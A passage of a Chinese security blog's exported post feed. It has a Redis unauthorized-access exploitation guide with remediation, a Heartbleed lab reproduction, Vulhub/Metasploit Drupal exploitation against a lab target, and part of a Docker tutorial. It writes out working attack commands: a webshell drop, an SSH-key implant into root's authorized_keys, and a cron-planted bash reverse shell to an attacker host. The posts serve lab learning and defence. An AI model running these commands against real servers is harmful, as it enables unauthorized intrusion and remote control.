dir/dbfilename#修改默认的Reids目录和rdb的文件名</span><br><span class="line">save#执行同步保存操作，将当前Redis实例的所有数据快照(snapshot)以RDB文件的形式保存到硬盘。</span><br><span class="line">bgsave#fork一个子进程来创建RDB文件，父进程可以继续处理命令请求。</span><br></pre></td></tr></table></figure><blockquote><p>注意：</p><p>save：会阻塞redis服务器进程，直到创建RDB文件完毕为止；（在此期间进程不能处理任何请求）<br>bgsave：命令执行之后立即返回 OK ，然后Redis fork 出一个新子进程，原来的Redis 进程(父进程)继续处理客户端请求，而子进程则负责将数据保存到磁盘，然后退出</p></blockquote><h2 id="五、攻击利用方式"><a href="#五、攻击利用方式" class="headerlink" title="五、攻击利用方式"></a>五、攻击利用方式</h2><h3 id="1-写Webshell"><a href="#1-写Webshell" class="headerlink" title="1. 写Webshell"></a>1. 写Webshell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CONFIG SET dir /var/www/#将rdb文件保存在/var/www/中</span><br><span class="line">CONFIG SET dbfilename redis.php#将rdb文件名修改为redis.php</span><br><span class="line">set shell &quot;&lt;?php phpinfo();?&gt;&quot;#往redis.php中写木马</span><br><span class="line">bgsave</span><br></pre></td></tr></table></figure><h3 id="2-ssh配置免密登录"><a href="#2-ssh配置免密登录" class="headerlink" title="2. ssh配置免密登录"></a>2. ssh配置免密登录</h3><p>条件：</p><ul><li>Redis服务使用ROOT账号启动 </li><li>服务器开放SSH服务，而且允许密钥登录，即可远程写入一个公钥，直接登录远程服务器</li></ul><p>先在渗透主机上生成 <code>ssh</code>的私钥与公钥：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa//一直回车即可</span><br><span class="line">(echo -e &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot;) &gt; hack.txt# 保存公钥到hack.txt中</span><br><span class="line">cat hack.txt | redis-cli -h 192.168.1.10 -p 6379 -x set hack # 把公钥写入到redis主机</span><br></pre></td></tr></table></figure><p>登陆访问redis</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.10.13</span><br></pre></td></tr></table></figure><p>修改RDB存储位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">bgsave</span><br></pre></td></tr></table></figure><p>ssh远程连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.10.13</span><br></pre></td></tr></table></figure><h3 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3. 反弹shell"></a>3. 反弹shell</h3><p>crontab周期性执行任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">crontab </span><br><span class="line">-l#查看当前任务</span><br><span class="line">-r#删除任务</span><br><span class="line">-e#编辑</span><br><span class="line">6部分：分钟 小时 天 月 星期 命令/脚本</span><br><span class="line">*/2 * * * * echo &quot;this is test&quot; &gt;&gt;/tmp/backup</span><br></pre></td></tr></table></figure><p>查看当前任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /var/spool/cron/</span><br><span class="line">ls</span><br><span class="line">cat root</span><br><span class="line">该文件内容等同于</span><br><span class="line">crontab -l</span><br></pre></td></tr></table></figure><p>写入crontab定时任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">set xx &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\n&quot;</span><br><span class="line">bgsave</span><br></pre></td></tr></table></figure><p>攻击者服务端开启监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vlnp 7999</span><br></pre></td></tr></table></figure><p><img src="/2019/05/15/Redis未授权访问漏洞/1557925558674.png" alt="1557925558674"></p><h2 id="六、修复"><a href="#六、修复" class="headerlink" title="六、修复"></a>六、修复</h2><h4 id="低权限运行Redis服务"><a href="#低权限运行Redis服务" class="headerlink" title="低权限运行Redis服务"></a>低权限运行Redis服务</h4><p>避免使用<code>root</code>用户身份启动<code>Redis</code>服务，选择权限较低的用户运行<code>rides</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure><h4 id="禁止命令"><a href="#禁止命令" class="headerlink" title="禁止命令"></a>禁止命令</h4><p>通过修改配置文件来禁止一些高风险的命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim redis.conf</span><br><span class="line">...</span><br><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command CONFIG   &quot;&quot;</span><br><span class="line">rename-command EVAL     &quot;&quot;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="添加密码认证"><a href="#添加密码认证" class="headerlink" title="添加密码认证"></a>添加密码认证</h4><p>通过配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim redis.conf</span><br><span class="line">requirepass PASSWORD</span><br></pre></td></tr></table></figure><p>也可以通过 <code>Redis</code>的命令行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; config set requirepass PASSWORD</span><br></pre></td></tr></table></figure><h4 id="禁止外网访问"><a href="#禁止外网访问" class="headerlink" title="禁止外网访问"></a>禁止外网访问</h4><p>通过防火墙等配置来禁止外网访问。</p><h2 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h2><p><code>Redis</code>匿名访问漏洞由不安全的运维配置引起的，作为配置 <code>Redis</code>的开发人员或运维人员一定要有一定的安全意识，才能更好的实现真正的安全。</p><h2 id="八、参考文章："><a href="#八、参考文章：" class="headerlink" title="八、参考文章："></a>八、参考文章：</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&amp;mid=2247486083&amp;idx=1&amp;sn=666450400463d4e5859dc5cc44e1c125&amp;chksm=fbf790f3cc8019e5cf5bc18d9613cdf753843ff168287aa02a7ffbbf10b1de14adda5014efd3&amp;mpshare=1&amp;scene=1&amp;srcid=0515suowq2IQTtgTS6p7CQYB&amp;key=6d5a213b9d007c25d3d2231d6bd6b4201c5288fd64eedafa935ba639a2fa4d47aeee0e6b412b4bf9d5bfa0b2a643faab2c1a323181f0b350c9abc93031a416d1ec1ba77485db2a58ba65a9d010cb0aa2&amp;ascene=1&amp;uin=MTU1MTA3MzA3OQ%3D%3D&amp;devicetype=Windows+10&amp;version=62060739&amp;lang=zh_CN&amp;pass_ticket=i1OV73MX6FUakKhfB6AFSufopQjomZv%2FYeYRGSAQ3oprOhX%2BLJdD5rJJCyLpPXYG" target="_blank" rel="noopener">Redis匿名访问漏洞</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2014-0160-心脏滴血漏洞</title>
      <link href="/2019/05/01/CVE-2014-0160-%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/05/01/CVE-2014-0160-%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="一、漏洞介绍"><a href="#一、漏洞介绍" class="headerlink" title="一、漏洞介绍"></a>一、漏洞介绍</h2><p><strong>CVE ID</strong>:</p><p>CVE-2014-0160</p><p><strong>漏洞范围</strong>：</p><p>OpenSSL1.0.1</p><p><strong>漏洞成因</strong>：</p><p>Heartbleed漏洞是由于未能在memcpy()调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪OpenSSL所分配的64KB缓存、将超出必要范围的字节信息复制到缓存当中再返回缓存内容，这样一来受害者的内存内容就会以每次64KB的速度进行泄露。</p><a id="more"></a><p><strong>漏洞危害</strong>：</p><p>如同漏洞成因所讲，我们可以通过该漏洞读取每次攻击泄露出来的信息，所以可能也可以获取到服务器的私钥，用户cookie和密码等。</p><h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><p>环境： bee-box虚拟机(已集成该漏洞环境)<br>bee-box虚拟机下载地址：<a href="https://sourceforge.net/projects/bwapp/files/bee-box/" target="_blank" rel="noopener">链接</a></p><h3 id="1-使用工具进行利用"><a href="#1-使用工具进行利用" class="headerlink" title="1. 使用工具进行利用"></a>1. 使用工具进行利用</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><ol><li><p>首先确定目标和端口信息</p><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556676583087.png" alt="1556676583087"></p><p>可以看到存在漏洞的端口为8443</p></li><li><p>使用nmap脚本进行漏洞检测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 8443 --script ssl-heartbleed.nse 192.168.224.131</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556676900297.png" alt="1556676900297"></p><p>可以看到该漏洞存在</p></li></ol><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><ol><li><p>使用msf的exp进行漏洞利用</p><ol><li><p>打开msfconsole</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556677575168.png" alt="1556677575168"></p></li><li><p>查找heartbleed模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search heartbleed</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556677615995.png" alt="1556677615995"></p></li><li><p>使用第一个模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ssl/openssl_heartbleed</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556677661603.png" alt="1556677661603"></p><p>第二个模块是用来</p></li><li><p>查看设置选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sshow options</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556677730237.png" alt="1556677730237"></p></li><li><p>设置RHOST，RPORT</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set RHOST 192.168.11.59</span><br><span class="line">set RPORT 443</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556677783208.png" alt="1556677783208"></p></li><li><p>设置VERBOSRE，值为true才能看到泄漏的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set</span><br><span class="line">set VERBOSE true</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556677911981.png" alt="1556677911981"></p></li><li><p>执行paload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure></li><li><p>如果有人正在登陆该web应用，可能获取到账号密码等信息</p><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556684475023.png" alt="1556684475023"></p><p>没有获取到数据是因为没有人登陆该应用或者登陆较少</p><p>下图是之前获取到数据的示例</p><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556679300981.png" alt="1556679300981"></p></li></ol></li></ol><h3 id="2-使用python脚本"><a href="#2-使用python脚本" class="headerlink" title="2. 使用python脚本"></a>2. 使用python脚本</h3><h4 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a><a href="https://github.com/Medicean/VulApps/blob/master/o/openssl/heartbleed_CVE-2014-0160/poc.py" target="_blank" rel="noopener">PoC</a></h4><p>修改 <code>poc.py</code> 中 <code>check</code> 函数的地址和端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">check(&apos;192.168.59.103&apos;, 443)</span><br></pre></td></tr></table></figure><p>然后执行poc.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc.py</span><br></pre></td></tr></table></figure><p>如果看到 <code>Heartbleed OpenSSL</code> 则代表存在漏洞。</p><h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a><a href="https://github.com/Medicean/VulApps/blob/master/o/openssl/heartbleed_CVE-2014-0160/exp.py" target="_blank" rel="noopener">Exp</a></h4><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py 192.168.59.103</span><br></pre></td></tr></table></figure><p>读取到的信息在当前目录下的 <code>result.txt</code> 内。</p><blockquote><p>具体使用参数请使用 <code>python exp.py -h</code></p></blockquote><p>参考链接：</p><p><a href="https://www.jianshu.com/u/13c720cf85fc" target="_blank" rel="noopener">ch3ckr</a>： <a href="https://www.jianshu.com/p/08600e2f4530" target="_blank" rel="noopener">https://www.jianshu.com/p/08600e2f4530</a></p><p><a href="https://github.com/Medicean" target="_blank" rel="noopener">Medicean</a>：<a href="https://github.com/Medicean/VulApps/tree/master/o/openssl/heartbleed_CVE-2014-0160" target="_blank" rel="noopener">https://github.com/Medicean/VulApps/tree/master/o/openssl/heartbleed_CVE-2014-0160</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenSSL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Docker+Vulhub搭建漏洞测试靶场</title>
      <link href="/2019/04/28/%E4%BD%BF%E7%94%A8Docker-Vulhub%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA/"/>
      <url>/2019/04/28/%E4%BD%BF%E7%94%A8Docker-Vulhub%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p>Vulhub是一个基于<code>docker</code>和<code>docker-compose</code>的漏洞环境集合，进入对应目录并执行一条语句即可启动一个全新的漏洞环境，让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。</p><a id="more"></a><h2 id="二、安装Docker"><a href="#二、安装Docker" class="headerlink" title="二、安装Docker"></a>二、安装Docker</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure><p>配置国内加速器，可以更快的拉取镜像资源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io</span><br></pre></td></tr></table></figure><h2 id="三、安装docker-compose"><a href="#三、安装docker-compose" class="headerlink" title="三、安装docker-compose"></a>三、安装docker-compose</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://bootstrap.pypa.io/get-pip.py | python//安装PIP</span><br><span class="line">pip install docker-compose//安装docker-compose</span><br></pre></td></tr></table></figure><h2 id="四、下载Vulhub"><a href="#四、下载Vulhub" class="headerlink" title="四、下载Vulhub"></a>四、下载Vulhub</h2><p>安装完成docker和docker-compose后，拉取Vulhub到本地任意目录即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure><p>安装完成后，执行<code>docker-compose -v</code>，有返回则说明安装成功。</p><h2 id="五、启动漏洞环境"><a href="#五、启动漏洞环境" class="headerlink" title="五、启动漏洞环境"></a>五、启动漏洞环境</h2><p>docker-compose会自动查找当前目录下的配置文件（默认文件名为<code>docker-compose.yml</code>），并根据其内容编译镜像和启动容器。所以，要运行某个漏洞靶场，需要先进入该漏洞所在的目录。</p><p>在这里演示Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞，进入<code>drupal/CVE-2014-3704/</code>目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /your-Vuln-Path/drupal/CVE-2014-3704/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>环境启动后，访问<code>http://your-ip:8080</code>即可看到Drupal的安装页面，使用默认配置安装即可。</p><p>其中，Mysql数据库名填写<code>drupal</code>，数据库用户名、密码为<code>root</code>，地址为<code>mysql</code>：</p><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554803517373.png" alt="1554803517373"></p><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554803658364.png" alt="1554803658364"></p><p>安装完成后，访问首页：</p><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554803788919.png" alt="1554803788919"></p><h2 id="六、漏洞测试"><a href="#六、漏洞测试" class="headerlink" title="六、漏洞测试"></a>六、漏洞测试</h2><h3 id="1-cmsmap扫描cms漏洞"><a href="#1-cmsmap扫描cms漏洞" class="headerlink" title="1. cmsmap扫描cms漏洞"></a>1. cmsmap扫描cms漏洞</h3><ol><li><p>下载cmsmap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Dionach/CMSmap.git</span><br></pre></td></tr></table></figure></li><li><p>安装parse模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install parse</span><br></pre></td></tr></table></figure></li><li><p>使用python运行扫描脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cmsmap.py http://192.168.10.18:8080</span><br></pre></td></tr></table></figure><p>得到漏洞详情</p><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554804365543.png" alt="1554804365543"></p></li></ol><h3 id="2-使用metasploit进行漏洞利用"><a href="#2-使用metasploit进行漏洞利用" class="headerlink" title="2. 使用metasploit进行漏洞利用"></a>2. 使用metasploit进行漏洞利用</h3><ol><li><p>启动metasploit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br></pre></td></tr></table></figure></li><li><p>搜索可利用模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search drupal</span><br><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2//使用该模块</span><br></pre></td></tr></table></figure><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554807336176.png" alt="1554807336176"></p></li><li><p>设置配置参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show options//查看可配置选项</span><br><span class="line">set rhost 192.168.10.18//设置目标IP</span><br><span class="line">set rport 8080//设置目标端口</span><br></pre></td></tr></table></figure><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554807568020.png" alt="1554807568020"></p></li><li><p>执行exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run//开始漏洞利用</span><br></pre></td></tr></table></figure><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554807630335.png" alt="1554807630335"></p></li><li><p>获取反弹shell</p><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554807710493.png" alt="1554807710493"></p></li></ol><h2 id="七、移除环境"><a href="#七、移除环境" class="headerlink" title="七、移除环境"></a>七、移除环境</h2><p>Vulhub中所有环境均为漏洞靶场，在测试结束后，请及时关闭并移除环境，避免被他人恶意利用。</p><p>漏洞测试结束后，返回到<code>drupal/CVE-2014-3704/</code>目录，执行如下命令移除环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down</span><br></pre></td></tr></table></figure><p>上述命令会执行如下几个动作：</p><ul><li>关闭正在运行的容器</li><li>删除所有相关容器</li><li>移除NAT（docker-compose在运行的时候会创建一个NAT网段）</li></ul><p>但不会移除编译好的漏洞镜像，下次再执行<code>docker-compose up -d</code>命令，就不需要再次编译相关镜像了。</p><p><strong>参考链接</strong>：</p><p>Vulhub官方文档：<a href="https://vulhub.org/#/docs/" target="_blank" rel="noopener">https://vulhub.org/#/docs/</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> Vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker入门&amp;&amp;环境部署实例</title>
      <link href="/2019/04/28/docker%E5%85%A5%E9%97%A8-%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2%E5%AE%9E%E4%BE%8B/"/>
      <url>/2019/04/28/docker%E5%85%A5%E9%97%A8-%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2%E5%AE%9E%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="一、docker介绍"><a href="#一、docker介绍" class="headerlink" title="一、docker介绍"></a>一、docker介绍</h1><p>docker是开源的应用程序容器引擎，使用go语言开发，借助于docker打包用户的应用程序，将这些应用程序包含在容器中，实现虚拟化，容器是完全使用沙箱机制，相互独立，占用资源非常少。</p><a id="more"></a><h1 id="二、docker三大核心概念"><a href="#二、docker三大核心概念" class="headerlink" title="二、docker三大核心概念"></a>二、docker三大核心概念</h1><ul><li><p>镜像</p><ul><li>image, docker镜像就是一个只读的模板，例如一个镜像中可以包含完整的操作系统，里面安装apache/php/mysql等环境，镜像可以创建容器</li></ul></li><li><p>容器</p><ul><li>container，docker利用容器运行程序，容器是从镜像中创建运行的实例，容器可以运行、关闭、删除</li></ul></li><li>仓库<ul><li>repository，集中存放镜像的地方，每个仓库中包含多个镜像，分为私有和公开，dockerHub</li></ul></li></ul><h1 id="三、docker安装"><a href="#三、docker安装" class="headerlink" title="三、docker安装"></a>三、docker安装</h1><h2 id="1-一键安装Docker"><a href="#1-一键安装Docker" class="headerlink" title="1. 一键安装Docker"></a>1. 一键安装Docker</h2><ol><li><p>这是推荐方式。在未安装过Docker的机器上，root权限执行如下命令即可一键安装最新版Docker：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure></li><li><p>也可以使用系统自带的包管理工具来安装，比如在Ubuntu下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker.io</span><br></pre></td></tr></table></figure></li></ol><h2 id="2-手动安装"><a href="#2-手动安装" class="headerlink" title="2.手动安装"></a>2.手动安装</h2><p>常见操作系统安装Docker的方法在文档中均可查阅，这里就不再赘述： <a href="https://docs.docker.com/engine/installation/" target="_blank" rel="noopener">https://docs.docker.com/engine/installation/</a></p><p><strong>注意</strong>，docker是一个系统服务，所以，安装完成后可能需要手工启动服务：<code>service start docker</code>，否则会出现连接失败的情况。同样，如果docker没有自启动，你也需要手工启动docker服务。如果你是使用一键安装工具安装的docker，则docker会自动启动。</p><h2 id="3-加入docker组"><a href="#3-加入docker组" class="headerlink" title="3. 加入docker组"></a>3. 加入docker组</h2><p>安装完成之后，普通用户每次执行docker命令都需要加上<code>sudo</code> ，所以我们可以加入doker用户组获取操作权限</p><ol><li><p>使用有sudo权限的帐号登录系统</p></li><li><p>创建docker分组，并将相应的用户添加到这个分组里面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -aG docker your_username</span><br></pre></td></tr></table></figure></li><li><p>退出，然后重新登录，以便让权限生效</p></li></ol><h2 id="4-添加国内镜像仓库"><a href="#4-添加国内镜像仓库" class="headerlink" title="4. 添加国内镜像仓库"></a>4. 添加国内镜像仓库</h2><p>由于官方资源库在国外，我们在拉取镜像资源的时候会很慢。所以，国内的Docker爱好者们就添加了一些国内的镜像（mirror）,方便大家使用。</p><p><strong>国内加速站点</strong></p><ul><li><p><a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors" target="_blank" rel="noopener">阿里云</a></p></li><li><p><a href="https://c.163yun.com/hub#/m/home/" target="_blank" rel="noopener">网易云</a></p></li><li><p><a href="https://www.daocloud.io/mirror" target="_blank" rel="noopener">DaoCloud</a></p></li></ul><ol><li><p>使用脚本来配置加速站点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io</span><br></pre></td></tr></table></figure></li><li><p>使用命令来配置加速站点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&apos;EOF&apos;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;&lt;your accelerate address&gt;&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>以上操作后重启一下 Docker</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker restart</span><br></pre></td></tr></table></figure></li></ol><h1 id="五、docker基本使用"><a href="#五、docker基本使用" class="headerlink" title="五、docker基本使用"></a>五、docker基本使用</h1><h2 id="1-启动docker"><a href="#1-启动docker" class="headerlink" title="1. 启动docker"></a>1. 启动docker</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker//centos</span><br><span class="line">server docker start//ubuntu</span><br></pre></td></tr></table></figure><p><strong>查看基本信息</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker info//当前容器的信息</span><br><span class="line">docker stats//运行容器的进程信息</span><br><span class="line">docker version//版本信息</span><br></pre></td></tr></table></figure><h2 id="2-镜像操作"><a href="#2-镜像操作" class="headerlink" title="2. 镜像操作"></a>2. 镜像操作</h2><p><strong>搜索镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search [关键字]</span><br></pre></td></tr></table></figure><p><strong>拉取镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull [镜像全称]:版本标签(可选)</span><br></pre></td></tr></table></figure><p><strong>查看本地镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p><strong>删除镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi 